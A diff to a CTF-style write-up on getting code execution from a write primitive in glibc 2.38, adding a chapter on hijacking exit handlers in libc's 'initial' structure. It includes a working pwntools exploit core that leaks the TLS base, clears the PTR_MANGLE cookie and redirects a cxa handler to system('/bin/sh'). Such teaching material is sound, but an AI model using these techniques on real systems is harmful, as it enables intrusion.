@@ -1,6 +1,6 @@
 # Code execution with a write primitive on last libc.
 
-
+## (a.k.a. [Six Different Ways](https://youtu.be/_1qY8IxLuWY))
 
 ## 1- Introduction
 
@@ -204,7 +204,7 @@ So there could be more `link_map` if ld.so load other libraries.
 
 for each `link_map` `_dl_call_fini()`function, check if there if `l_info[DT_FINI_ARRAY]` fini array is defined
 
-> for libc-2.38,  DT_FINI_ARRAY l_info index is 0x1a, DT_FINI_ARRAYSZ l_info index is 0x1c
+> for libc-2.38,  DT_FINI_ARRAY l_info index is 26, DT_FINI_ARRAYSZ l_info index is 28
 
 `l_info[DT_FINI_ARRAY] ` point to a `ElfW(Dyn)`structure declared like this (in `elf/elf.h`):t
 
@@ -277,9 +277,15 @@ which handle old-style destructors, this is not an array in this case, but only 
 
 It's calculation is done in the same way of "new-style" destructors, by adding `map->l_addr` the base mapping address , with the `Elfw(Dyn)`structure `d_un_d_ptr` entry (structure pointed by the entry `l_info[DT_FINI]`)
 
+> for libc-2.38,  DT_FINI l_info index is 13
+
 So as for previous mechanism, you can write to `l_info[DT_FINI]`  to makes it points to a forged `EflW(Dyn)` structure in a memory zone you control too.
 
 that's even a bit simpler than "new-style" destructors as you have to forge only one structure.
+
+Sometimes gcc will create a default `DT_FINI`entry in program `link_map`  that will point to program `.bss` RW zone,
+
+this offset will point to a default `_dl_fini` function in binary that does nothing,  this offset can be overwritten too, to points to another function.
 
 **exemple:** do you like it tricky?
 
@@ -562,4 +568,187 @@ sla('choice> ', '2')
 the exploit use stdout readmem macro to leak ld.so base, but depending where your tls-storage is mapped,
 
 a libc leak could be enough..
+
+------
+
+## 6 - Code execution via other mangled pointers in initial structure
+
+There are other mangled pointers that are usable for getting code execution, called at exit by `__run_exit_handlers()` function
+
+The problem with mangled pointers, is that they need one leak of the `PTR_MANGLE` cookie. So you will need a read primitive to leak it, or to use the trick of using `stdout` as a read primitive. 
+
+You can also overwrite `PTR_MANGLE` cookie to erase it like I did in chapter 5, which will avoid you having to leak it, but in chapter 5 this was possible as a single write because of proximity of cookie with `dtor_list`, here you will need two writes to do it.
+
+> The prerequisite for this way to achieve code execution, is that the program must exits via `return`, or via `exit()` libc function.
+>
+> You will have to leak or erase `PTR_MANGLE` cookie pointer in `tls-storage` to calculate the pointer value.
+
+so let's have a look a `__run_exit_handlers()` part that will call these mangled function in `initial` structure:
+
+```c
+  while (true)
+    {
+      struct exit_function_list *cur;
+
+    restart:
+      cur = *listp;
+
+      if (cur == NULL)
+	{
+	  /* Exit processing complete.  We will not allow any more
+	     atexit/on_exit registrations.  */
+	  __exit_funcs_done = true;
+	  break;
+	}
+
+      while (cur->idx > 0)
+	{
+	  struct exit_function *const f = &cur->fns[--cur->idx];
+	  const uint64_t new_exitfn_called = __new_exitfn_called;
+
+	  switch (f->flavor)
+	    {
+	      void (*atfct) (void);
+	      void (*onfct) (int status, void *arg);
+	      void (*cxafct) (void *arg, int status);
+	      void *arg;
+
+	    case ef_free:
+	    case ef_us:
+	      break;
+	    case ef_on:
+	      onfct = f->func.on.fn;
+	      arg = f->func.on.arg;
+	      PTR_DEMANGLE (onfct);
+
+	      /* Unlock the list while we call a foreign function.  */
+	      __libc_lock_unlock (__exit_funcs_lock);
+	      onfct (status, arg);
+	      __libc_lock_lock (__exit_funcs_lock);
+	      break;
+	    case ef_at:
+	      atfct = f->func.at;
+	      PTR_DEMANGLE (atfct);
+
+	      /* Unlock the list while we call a foreign function.  */
+	      __libc_lock_unlock (__exit_funcs_lock);
+	      atfct ();
+	      __libc_lock_lock (__exit_funcs_lock);
+	      break;
+	    case ef_cxa:
+	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
+		 we must mark this function as ef_free.  */
+	      f->flavor = ef_free;
+	      cxafct = f->func.cxa.fn;
+	      arg = f->func.cxa.arg;
+	      PTR_DEMANGLE (cxafct);
+
+	      /* Unlock the list while we call a foreign function.  */
+	      __libc_lock_unlock (__exit_funcs_lock);
+	      cxafct (arg, status);
+	      __libc_lock_lock (__exit_funcs_lock);
+	      break;
+	    }
+
+	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
+	    /* The last exit function, or another thread, has registered
+	       more exit functions.  Start the loop over.  */
+	    goto restart;
+	}
+
+      *listp = cur->next;
+      if (*listp != NULL)
+	/* Don't free the last element in the chain, this is the statically
+	   allocate element.  */
+	free (cur);
+    }
+
+  __libc_lock_unlock (__exit_funcs_lock);
+```
+
+the  `f` variable will point to `initial`structure, and depending on value of `f->flavor` entry, different functions will be called.
+
+you can see in this code, that the function pointer is "demangled" with the macro `PTR_DEMANGLE` before being called.
+
+another interesting thing to note,is that you can set a controlled argument for `ef_on`and `ef_cxa` flavors, which is very handful as we can use `system()` for function for example, and pass the command line as argument.
+
+let's have a look at `initial`structure, as used in our `prog`
+
+```c
+gef> p initial
+$2 = {
+  next = 0x0,
+  idx = 0x1,
+  fns = {
+    [0x0] = {
+      flavor = 0x4,
+      func = {
+        at = 0xaeb5b4a4feb64ef7,
+        on = {
+          fn = 0xaeb5b4a4feb64ef7,
+          arg = 0x0
+        },
+        cxa = {
+          fn = 0xaeb5b4a4feb64ef7,
+          arg = 0x0,
+          dso_handle = 0x0
+        }
+      }
+    },
+    [0x1] = {
+      flavor = 0x0,
+      func = {
+        at = 0x0,
+        on = {
+          fn = 0x0,
+          arg = 0x0
+        },
+        cxa = {
+          fn = 0x0,
+          arg = 0x0,
+          dso_handle = 0x0
+        }
+      }
+    } <repeats 31 times>
+  }
+}
+```
+
+values of different flavors are defined in `stdlib/exit.h`
+
+```c
+enum
+{
+  ef_free,      /* `ef_free' MUST be zero!  */
+  ef_us,
+  ef_on,
+  ef_at,
+  ef_cxa
+};
+```
+
+in the `initial` structure used in our `prog`binary, you can see that the flavor is 4, which is `ef_cxa` 
+
+you can find an example of exploit that will leak `tls-storage` via stdout read primitive trick, then will erase the `PTR_MANGLE`cookie, and will overwrite `cxa` entry in initial with `system('/bin/sh')`  in `exp_mangled_initial.py`
+
+the core of the exploit looks like this:
+
+```python
+stdout = int(rcu('leak: ','\n'),16)
+libc.address = stdout-libc.sym['_IO_2_1_stdout_']
+logbase()
+
+# leak tls base
+tls = u64(readmem(stdout,  libc.address+0x1ff898, 8, 1)) - 0x3c000
+logleak('tls base', tls)
+cookie = tls + 0x770    # PTR_MANGLE cookie
+logleak('tls PTR_MANGLE cookie', cookie)
+# clear PTR_MANGLE cookie
+write(cookie, p64(0))
+
+# overwrite initial cxa func with system & its arg with '/bin/sh' string address
+write(libc.sym['initial']+24, p64(libc.sym['system']<<17)+p64(next(libc.search(b'/bin/sh'))) )
+# exit to shell
+sla('choice> ', '2')
+```
 
